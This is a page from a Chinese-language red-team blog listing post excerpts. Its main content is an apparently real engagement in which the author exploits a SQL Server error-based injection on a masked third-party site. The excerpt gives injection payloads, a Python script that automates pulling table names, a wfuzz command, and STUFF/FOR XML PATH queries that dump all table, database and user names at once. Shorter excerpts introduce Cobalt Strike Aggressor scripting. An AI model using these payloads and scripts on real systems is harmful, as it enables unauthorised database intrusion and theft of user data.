        <span class="n">headers</span> <span class="o">=</span> <span class="p">[(</span><span class="n">name</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span> <span class="k">for</span> <span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span> <span class="ow">in</span> <span class="n">resp</span><span class="p">.</span><span class="n">raw</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="n">items</span><span class="p">()</span>
                   <span class="k">if</span> <span class="n">name</span><span class="p">.</span><span class="n">lower</span><span class="p">()</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">excluded_headers</span><span class="p">]</span>
</code></pre></div></div>

<p>这里的解决方式是剔除编码头 Content-Encoding。</p>
-->
          SSRF(Server-side Request Forge, 服务端请求伪造)。由攻击者构造的攻击链接传给服务端执行造成的漏洞，一般用来在外网探测或攻击内网服务...
          <p>
            <a class="post-link" href="/archivers/2020-03-21/2">Read More »</a>
          </p>
        </div>
      </li>
    
      <li>
        <h2>
          <a class="post-link" href="/archivers/2020-03-02/3">SQL Server注入 - STUFF与XML Path</a>
        </h2>
        
        <div class="post-meta">Mar 2, 2020</div>

        <div class="post-excerpt">
          <!--<h2 id="背景">背景</h2>

<p>某次XX，发现一处SQL Server注入点</p>

<h2 id="报错注入">报错注入</h2>

<p>SQL Server注入，一般也是先找库、再找表、再查字段、最终查询数据。</p>

<h2 id="查库">查库</h2>

<p>1.查第一个：</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">and</span> <span class="p">(</span><span class="k">SELECT</span> <span class="n">top</span> <span class="mi">1</span> <span class="n">Name</span> <span class="k">FROM</span> <span class="n">Master</span><span class="p">..</span><span class="n">SysDatabases</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">0</span> <span class="c1">--</span>
</code></pre></div></div>

<p>2.NOT IN</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">id</span><span class="o">=</span><span class="mi">1</span> <span class="k">and</span> <span class="p">(</span><span class="k">SELECT</span> <span class="n">top</span> <span class="mi">1</span> <span class="n">Name</span> <span class="k">FROM</span> <span class="n">Master</span><span class="p">..</span><span class="n">SysDatabases</span> <span class="k">where</span> <span class="n">name</span> <span class="k">not</span> <span class="k">in</span> <span class="p">(</span><span class="s1">'master'</span><span class="p">))</span><span class="o">&gt;</span><span class="mi">0</span> <span class="c1">--</span>
</code></pre></div></div>

<p>其中，NOT IN的集合会不断增加，最终无法查出其他结果，那么这个集合就是所有的数据库名称。</p>

<h2 id="查表">查表</h2>

<p>在这一步，我们就可以自动化实现了：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">re</span>

<span class="n">table_list</span> <span class="o">=</span> <span class="p">[</span><span class="s">''</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">get_sqlserver_table</span><span class="p">(</span><span class="n">table_list</span><span class="p">,</span> <span class="n">table_num</span><span class="p">):</span>
    <span class="k">for</span> <span class="n">num</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">table_num</span><span class="p">):</span>
        <span class="c1"># print("','".join(table_list))
</span>        <span class="n">sql_str</span> <span class="o">=</span> <span class="s">"and (select top 1 name from [xxxx].sys.all_objects where type='U' AND is_ms_shipped=0 and name not in ('{}'))&gt;0"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="s">"','"</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">table_list</span><span class="p">))</span>
        <span class="n">url</span> <span class="o">=</span> <span class="s">"http://www.xxxxx.cn/x.aspx?cid=1' {} AND 'aNmV'='aNmV"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">sql_str</span><span class="p">)</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">'User-Agent'</span><span class="p">:</span> <span class="s">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36'</span><span class="p">})</span>
        <span class="n">res</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s">'\'(.*)\''</span><span class="p">,</span> <span class="n">r</span><span class="p">.</span><span class="n">content</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">),</span>  <span class="n">re</span><span class="p">.</span><span class="n">M</span><span class="o">|</span><span class="n">re</span><span class="p">.</span><span class="n">I</span><span class="p">)</span>
        <span class="n">table_name</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
        <span class="n">table_list</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">table_name</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"[{}] - TableName: {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">status_code</span><span class="p">),</span> <span class="n">table_name</span><span class="p">))</span>
<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">get_sqlserver_table</span><span class="p">(</span><span class="n">table_list</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>

</code></pre></div></div>

<p>当取得第16个的时候，还是没有出现用户表、管理员表等，而且网站抛出了错误，无法继续取，突然没有其他办法了。</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/d60590ed04ec4d3da6e917429c7cc4d4.png" alt="2020-03-01-11-34-21" /></p>

<p>先来分析一下语句：</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cid</span> <span class="o">=</span><span class="mi">1</span> <span class="k">and</span> <span class="p">(</span><span class="k">select</span> <span class="n">top</span> <span class="mi">1</span> <span class="n">name</span> <span class="k">from</span> <span class="p">[</span><span class="err">数据库名称</span><span class="p">].</span><span class="n">sys</span><span class="p">.</span><span class="n">all_objects</span> <span class="k">where</span> <span class="k">type</span><span class="o">=</span><span class="s1">'U'</span> <span class="k">AND</span> <span class="n">is_ms_shipped</span><span class="o">=</span><span class="mi">0</span> <span class="k">and</span> <span class="n">name</span> <span class="k">not</span> <span class="k">in</span> <span class="p">(</span><span class="s1">''</span><span class="p">))</span><span class="o">&gt;</span><span class="mi">0</span> <span class="k">AND</span> <span class="s1">'aNmV'</span><span class="o">=</span><span class="s1">'aNmV
</span></code></pre></div></div>

<p>这是第一次请求的Payload，集合这里我写个空，不管怎样，集合都可以取得第一个表名。第二个、第三个表名都会向集合增加，以此类推，通过SQLMAP判断，有146个表。</p>

<p>到第16个因为原始语句有干扰，不能继续取得后续的表名，但我不想放弃。</p>

<p>于是，又想到通过FUZZ的方式：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/835850cccf61c6d461e1fa9e4bede6bc.png" alt="2020-03-01-11-34-39" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz -c -z file,/usr/shar/sqlmap/data/common-table.txt --sc 500 "http://www.xxx/xxx?cid=1%27%20and%20%20(select%20top%201%20COLUMN_NAME%20from%20xxx.information_schema.columns%20where%20TABLE_NAME=%27Hsoft_FUZZ%27%20and%20COLUMN_NAME%20not%20in(%27x%27))%3E0%20and%20%27s%27=%27s"
</code></pre></div></div>

<ul>
  <li><code class="language-plaintext highlighter-rouge">Hsoft_</code> 为前缀</li>
  <li>sc 500 只匹配错误页面（报错注入）</li>
</ul>

<p>但是字典貌似不够强大，我就去查询SQL Server有没有类似将多行数据合并为一行的办法。</p>

<p>我知道MySQL中有GroupConcat类似的函数，但SQL Server没有，这点很遗憾~ 没有继续使用SQL Map是因为SQLMAP根本无法取得任何一个表名，期间我也分析了SQL MAP的Payload，请求实在是多，就放弃了这条线。</p>

<h2 id="stuff与xml-path">STUFF与XML Path</h2>

<p>STUFF字符串函数是将字符串插入到另一个字符串中。它会删除开始位置第一个字符串中的指定长度的字符，然后将第二个字符串插入到开始位置的第一个字符串中，语法如下。</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">STUFF</span><span class="err">（</span><span class="o">&lt;</span><span class="n">character_expression</span><span class="o">&gt;</span><span class="err">，</span><span class="o">&lt;</span><span class="err">开始</span><span class="o">&gt;</span><span class="err">，</span><span class="o">&lt;</span><span class="err">长度</span><span class="o">&gt;</span><span class="err">，</span><span class="o">&lt;</span><span class="n">character_expression</span><span class="o">&gt;</span><span class="err">）</span>
<span class="o">&lt;</span><span class="n">character_expression</span><span class="o">&gt;</span>
</code></pre></div></div>

<p>参数是给定的字符串数据，可以是字符或二进制数据的常量，变量或列。<code class="language-plaintext highlighter-rouge">&lt;start&gt;</code>参数是一个整数值，指定开始删除和插入的位置，可以是BIGINT类型。如果<code class="language-plaintext highlighter-rouge">&lt;开始&gt;</code>或<code class="language-plaintext highlighter-rouge">&lt;长度&gt;</code>参数为负数，则返回NULL字符串。如果<code class="language-plaintext highlighter-rouge">&lt;start&gt;</code>参数比第一个<code class="language-plaintext highlighter-rouge">&lt;character_expression&gt;</code>长，则返回一个NULL字符串。 <length>参数可以是BIGINT类型，它是一个整数，指定要删除的字符数。如果<length>比第一个`<character_expression>`长，则删除发生到最后一个`<character_expression>`中的最后一个字符。</character_expression></character_expression></length></length></p>

<p>STUFF最常见的用途莫过于结合FOR XML PATH对返回JSON字符串的拼接。首先利用FOR XML PATH则返回XML格式的字符串，我们将FOR XML PATH添加到查询的末尾，此时允许我们将查询的结果作为XML元素输出，元素名称包含在PATH参数中。</p>

<p>如：</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">name</span> <span class="k">FROM</span> <span class="n">dbo</span><span class="p">.</span><span class="n">base_pay_type</span> <span class="k">WHERE</span> <span class="n">is_enabled</span> <span class="o">=</span> <span class="mi">1</span>
</code></pre></div></div>

<p>类似的SQL可能会返回多行数据，因此可以通过STUFF与XML PATH集合使用：</p>

<ul>
  <li>将查询到的数据转换成行，以逗号隔开，以<code class="language-plaintext highlighter-rouge">[]</code>包裹</li>
</ul>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">STUFF</span><span class="p">((</span><span class="k">SELECT</span>  <span class="s1">'['</span> <span class="o">+</span> <span class="n">name</span> <span class="o">+</span> <span class="s1">'],'</span>  
<span class="k">FROM</span><span class="p">(</span><span class="k">SELECT</span> <span class="n">name</span> <span class="k">FROM</span> <span class="n">dbo</span><span class="p">.</span><span class="n">base_pay_type</span> <span class="k">WHERE</span> <span class="n">is_enabled</span> <span class="o">=</span> <span class="mi">1</span><span class="p">)</span> <span class="n">a</span>  <span class="k">FOR</span>  <span class="n">XML</span> <span class="n">PATH</span><span class="p">(</span><span class="s1">''</span><span class="p">)</span>  <span class="p">),</span> <span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span> <span class="s1">''</span><span class="p">)</span> <span class="k">AS</span> <span class="n">Name</span> 
</code></pre></div></div>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/7fadd9802ea0134308ad9c8e3e1fa7eb.png" alt="2020-03-01-11-35-00" /></p>

<p>直接套用到注入场景：</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">STUFF</span><span class="p">((</span><span class="k">SELECT</span>  <span class="s1">'['</span> <span class="o">+</span> <span class="n">name</span> <span class="o">+</span> <span class="s1">'],'</span>  <span class="k">FROM</span><span class="p">(</span><span class="k">SELECT</span> <span class="n">name</span> <span class="k">from</span> <span class="err">数据库名称</span><span class="p">.</span><span class="n">sys</span><span class="p">.</span><span class="n">all_objects</span> <span class="k">where</span> <span class="k">type</span><span class="o">=</span><span class="s1">'U'</span> <span class="k">AND</span> <span class="n">is_ms_shipped</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span> <span class="n">a</span>  <span class="k">FOR</span>  <span class="n">XML</span> <span class="n">PATH</span><span class="p">(</span><span class="s1">''</span><span class="p">)</span>  <span class="p">),</span> <span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span> <span class="s1">''</span><span class="p">)</span>
</code></pre></div></div>

<p>在sql shell中直接执行即可返回所有表名：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/f1db9589f0c703b6ff101490ab00b90e.png" alt="2020-03-01-11-35-15" /></p>

<p>所有表名以<code class="language-plaintext highlighter-rouge">[表名],</code>分割。</p>

<p>通过这个办法，我们可以套用很多需要多次请求注入的需求，如：</p>

<ul>
  <li>取得某个表10个用户名</li>
</ul>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">STUFF</span><span class="p">((</span><span class="k">SELECT</span>  <span class="s1">'['</span> <span class="o">+</span> <span class="n">username</span> <span class="o">+</span> <span class="s1">'],'</span>  <span class="k">FROM</span><span class="p">(</span><span class="k">SELECT</span> <span class="n">Top</span> <span class="mi">10</span> <span class="n">username</span> <span class="k">from</span> <span class="err">数据库名称</span><span class="p">.</span><span class="k">User</span> <span class="p">)</span> <span class="n">a</span>  <span class="k">FOR</span>  <span class="n">XML</span> <span class="n">PATH</span><span class="p">(</span><span class="s1">''</span><span class="p">)</span>  <span class="p">),</span> <span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span> <span class="s1">''</span><span class="p">)</span>
</code></pre></div></div>

<ul>
  <li>取得所有数据库名</li>
</ul>

<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">STUFF</span><span class="p">((</span><span class="k">SELECT</span>  <span class="s1">'['</span> <span class="o">+</span> <span class="n">Name</span> <span class="o">+</span> <span class="s1">'],'</span>  <span class="k">FROM</span><span class="p">(</span><span class="k">SELECT</span>  <span class="n">Name</span> <span class="k">from</span> <span class="n">Master</span><span class="p">..</span><span class="n">SysDatabases</span> <span class="p">)</span> <span class="n">a</span>  <span class="k">FOR</span>  <span class="n">XML</span> <span class="n">PATH</span><span class="p">(</span><span class="s1">''</span><span class="p">)</span>  <span class="p">),</span> <span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span> <span class="s1">''</span><span class="p">)</span>
</code></pre></div></div>

<p>其他场景自行想象！</p>
-->
          <!---->
          某次**，发现一处SQL Server注入点
          <p>
            <a class="post-link" href="/archivers/2020-03-02/3">Read More »</a>
          </p>
        </div>
      </li>
    
      <li>
        <h2>
          <a class="post-link" href="/archivers/2020-03-02/5">Cobalt Strike Aggressor Script （第二课）</a>
        </h2>
        
        <div class="post-meta">Mar 2, 2020</div>

        <div class="post-excerpt">
          <!--<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/e320cfd0c5bfb563f43f2d9f3c4f090c.png" alt="" /></p>

<h2 id="基础菜单">基础菜单</h2>

<p>以popup当做修饰符号的函数体是菜单，一般是Cobalt Strike的菜单栏；</p>

<p>先构建一个简单的菜单：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>popup event_say {
        item("&amp;Say", { 
           # 函数体
        });
        separator(); #分割线
}

</code></pre></div></div>

<p>一个菜单可以有多个item，也就是多个元素，元素中可以写动作代码，也可以写函数。</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>popup event_say {
        item("&amp;Say", { 
            say();
        });
        separator();
}
</code></pre></div></div>

<p>紧接着还有一个重要的菜单函数：<code class="language-plaintext highlighter-rouge">menubar("Event-Say", "event_say");</code></p>

<p>第一个参数是菜单名称，第二个是函数名称，这个函数通过参数将菜单名称与函数名绑定起来。</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/e41d4bbf548823ea9628a2851132845b.png" alt="2020-03-01-11-43-30" /></p>

<h2 id="日志函数">日志函数</h2>

<p>通过elog函数可以打印事件日志：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>elog("something ...");
</code></pre></div></div>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/8f4661412f64e8f45c087dc08bd28ffc.png" alt="2020-03-01-11-43-38" /></p>

<p>我们可以封装一个函数，名为say：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sub say {
	elog("\c3Hello Everyone!");
}
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">\c</code>是Cobalt Strike的彩色样式开关，类似的还有其他颜色：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/917bec98b3cc352ce80d10861909f4ae.png" alt="2020-03-01-11-43-47" /></p>

<p>执行结果：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/7bbc5f8ebe902195f3b44bd096184988.png" alt="2020-03-01-11-43-53" /></p>

<h2 id="对话框-输入">对话框-输入</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dialog("Hello", # 对话框标题-字符串 
%(name =&gt; "tom"),  # 对话框输入项及默认值-hashes
&amp;callback); # 对话框点击完成后的回调函数
</code></pre></div></div>

<p>这里我实现了一个输入框，并将输入框的值通过elog打印出来：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sub say {
	elog("\c3Hello ".$1."!"); # 日志打印
}

menubar("Event-Say", "event_say"); # 注册菜单

popup event_say {
        item("&amp;Say", { 
            dialog_show($dialog); # 展示对话框
        });
        separator(); # 分割线
}


sub callback {
	say($3['name']); # $1 为 dialog的引用 $2 按钮的名称 $3 对话框输入的值，hashes类型
}

$dialog = dialog("Hello", %(name =&gt; "tom"), &amp;callback);
drow_text($dialog, "name", "YourName:  ");
dbutton_action($dialog, "Go");

</code></pre></div></div>

<p>dialog的手册：https://cobaltstrike.com/aggressor-script/functions.html#dialog</p>

<p>当点击 菜单项时，弹出对话框：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/999e906c81ed31d4e3dadb432c2b2a30.png" alt="2020-03-01-11-44-03" /></p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/67afe867ab28b61c48f028a8bcec5baf.png" alt="2020-03-01-11-44-10" /></p>
-->
          本节课带大家做一个Say-Hello的脚本来熟悉菜单的构建以及对话框的使用
          <p>
            <a class="post-link" href="/archivers/2020-03-02/5">Read More »</a>
          </p>
        </div>
      </li>
    
      <li>
        <h2>
          <a class="post-link" href="/archivers/2020-03-02/4">Cobalt Strike Aggressor Script （第一课）</a>
        </h2>
        
        <div class="post-meta">Mar 2, 2020</div>

        <div class="post-excerpt">
          <!--<h2 id="前言">前言</h2>

<p>在后渗透阶段，目前较为流行的C2平台就属Cobalt Strike做的比较优秀了；目前国内的论坛、网站上已经放出很多版本，最新的为Cobalt Strike 3.14，目前最新版本4.0已不再有试用版。</p>

<p>起初我刚接触Cobalt Strike时，觉得非常不习惯，从Metasploit萌新走来，觉得这个图形化软件远远比不上Metasploit的模块丰富，后经过长时间的使用以及研究，从这个项目中学习到了很多技术，被开发者的思想所折服，应该算比较超前的一款值得学习的平台了。</p>

<h2 id="aggressor-script">Aggressor Script</h2>

<p>Aggressor Script是Cobalt Strike 3.0版本以上的一个内置脚本语言，由<a href="http://sleep.dashnine.org/manual">Sleep语言</a>解析，Cobalt Strike 3.0以上版本的菜单、选项、事件都由default.cna构建。红队人员可以通过它来调用一些IRC、Webhook接口去对接机器人，实现自动化渗透与监控，Aggressor Script是Cobalt Strike这款C2平台的画龙点睛之笔。</p>

<p>对于Python、C/C++爱好者来说，Sleep语言一开始接触的时候感觉很奇怪，会有很多想吐槽的点，但久而久之，就会发现它的便捷之处。</p>

<h2 id="安装sleep语言环境">安装Sleep语言环境</h2>

<p>为了快速掌握Aggressor Script，需要先掌握和熟悉一些Sleep的语法，不然遇到错误无法发现自己错在哪里。</p>

<p>Sleep语言下载地址：http://sleep.dashnine.org/download/sleep.jar</p>

<p>启动Sleep脚本语言解释器：</p>

<p><code class="language-plaintext highlighter-rouge">java -jar sleep.jar</code></p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/e0f895f33d4158b26767d6589ecd9d39.png" alt="2020-03-01-11-37-38" /></p>

<h2 id="sleep语言数据类型">Sleep语言数据类型</h2>

<ul>
  <li>数字</li>
  <li>字符串</li>
  <li>Arrays</li>
  <li>Lists</li>
  <li>Stacks</li>
  <li>Sets</li>
  <li>Hashs</li>
</ul>

<p>Sleep语法手册：http://sleep.dashnine.org/manual/</p>

<p>这里主要介绍一些特殊的数据类型：Stacks、Lists、Hashs</p>

<p>Array数据类型支持多种数据存放在一起，也就是说Array是一个复合数据类型；</p>

<p>例如：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># create a  List
@foo = @('foo',123.0,'bar');
println(@foo[0])
</code></pre></div></div>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/1c43ab77a1dffdac57cbad0d4585a570.png" alt="2020-03-01-11-37-53" /></p>

<p>遍历：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@foo = @('foo',123.0,'bar');
foreach $var (@foo)
{
   println($var);
}
</code></pre></div></div>

<p>Stacks 栈 - “后进先出”</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># create a Stacks
push(@stack, "apple");
push(@stack, "banana");
push(@stack, "cucumber");

println("Stack is: " . @stack);
$value = pop(@stack);
println("Top item is: " . $value);
println("Stack is: " . @stack[0]);
</code></pre></div></div>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/a2877a7bc5af430992a89b92c0eda12d.png" alt="2020-03-01-11-38-02" /></p>

<p>Hashes 更像是Python中的字典 Key-Value</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$x = 3;
%foo["name"] = "Raphael";
%foo["job"]  = "wasting time";
%foo[$x]     = "Michelangelo";

println("%foo is: " . %foo);
</code></pre></div></div>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/610a7f003c87fdf43c9a94a145d9321f.png" alt="2020-03-01-11-38-12" /></p>

<h2 id="创建一个与用户交互的函数">创建一个与用户交互的函数</h2>

<p>一般，我们通常会在beacon中输入命令给Cobalt Strike，这些命令背后的代码其实都被事件关联起来了，下面来一个示例，做一次我们自己的命令绑定。</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sub print_hello{
    println("Hello $1");
}

command say {
	print_hello($1);
}
</code></pre></div></div>

<p>加载到Cobalt Strike后，在Aggressor Script控制台输入say Tom就可以运行脚本了：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/02dc973c9be7df456ab74cf746577b33.png" alt="2020-03-01-11-38-22" /></p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/7c2bbddd45bf4c1c83998ea42b35f077.png" alt="2020-03-01-11-38-29" /></p>

<p>可以发现，Sleep的函数通过$数字来寻找函数参数，这个虽然友好，但是还是有说不出的难受…</p>

<p>下一课介绍Cobalt Strike的菜单创建以及快捷键绑定。</p>

-->
          在后渗透阶段，目前较为流行的C2平台就属Cobalt Strike做的比较优秀了；目前国内的论坛、网站上已经放出很多版本，最新的为Cobalt Strike 3.14，目前最新版本4.0已不再有试用版。
          <p>
            <a class="post-link" href="/archivers/2020-03-02/4">Read More »</a>
          </p>
        </div>
      </li>
    
  </ul>
  
  <!-- Pagination links -->
<div class="pagination">
  
    <a href="/page3" class="previous">PREV</a>
  
  <span class="page_number ">4 of 34</span>
  
    <a href="/page5" class="next">NEXT</a>
  
</div>

</div>

        </div>
        <div class="col-second">
          <div class="col-box col-box-author">
  <img class="avatar" src="//avatars0.githubusercontent.com/u/19944759?s=150&v=4" alt="倾旋">
  <div class="col-box-title name">倾旋</div>
  <p>特点：爪子长、个子高、身体瘦弱
</p>
  <p class="contact">
    
    <a href="https://github.com/Rvn0xsy">GitHub</a>
    
    
    <a href="https://twitter.com/Rvn0xsy">Twitter</a>
    
    
    <a href="mailto:rvn0xsy@gmail.com">Email</a>
    
    <a href="#">微信</a>
    
  </p>
</div>

<div class="col-box">
  <div class="col-box-title">Newest Posts</div>
  <ul class="post-list">
    
      <li><a class="post-link" href="/archivers/2021-02-18/1">Pricking 项目（一） ：使用介绍</a></li>
    
      <li><a class="post-link" href="/archivers/2021-02-18/2">Pricking 项目（二） ：JS模块开发</a></li>
    
      <li><a class="post-link" href="/archivers/2021-02-16/1">红队技巧：基于反向代理的水坑攻击</a></li>
    
      <li><a class="post-link" href="/archivers/2021-02-09/1">CVE-2021-3156 - Exploit修改</a></li>
    
      <li><a class="post-link" href="/archivers/2021-02-08/1">静态恶意代码逃逸（第十课）</a></li>
    
      <li><a class="post-link" href="/archivers/2021-01-31/1">Windows权限控制相关的防御与攻击技术</a></li>
    
      <li><a class="post-link" href="/archivers/2020-11-29/2">静态恶意代码逃逸（第九课）</a></li>
    
      <li><a class="post-link" href="/archivers/2020-11-29/1">静态恶意代码逃逸（第八课）</a></li>
    
      <li><a class="post-link" href="/archivers/2020-11-13/1">Linux透明代理在红队渗透中的应用</a></li>
    
      <li><a class="post-link" href="/archivers/2020-11-01/1">Web正向代理的思考</a></li>
    
      <li><a class="post-link" href="/archivers/2020-10-23/1">静态恶意代码逃逸（第七课）</a></li>
    
      <li><a class="post-link" href="/archivers/2020-08-24/1">这是一个充满挑战的好时代</a></li>
    
      <li><a class="post-link" href="/archivers/2020-07-16/1">通过OXID解析器获取Windows远程主机上网卡地址</a></li>
    
      <li><a class="post-link" href="/archivers/2020-06-28/1">如何实现一个Atexec</a></li>
    
      <li><a class="post-link" href="/archivers/2020-04-02/1">如何实现一个Psexec</a></li>
    
    <li><a class="post-link" href="/posts/">更多....</a></li>
  </ul>
</div>

<div class="col-box post-toc hide">
  <div class="col-box-title">TOC</div>
</div>

        </div>
      </div>
    </div>

    <footer class="footer">
<div class="wrapper">
© 2021 倾旋
</div>
</footer>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-158746438-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-158746438-1');
</script>

<script type="text/x-mathjax-config">MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});</script>
<script src="/js/easybook.js"></script>


  </body>

</html>
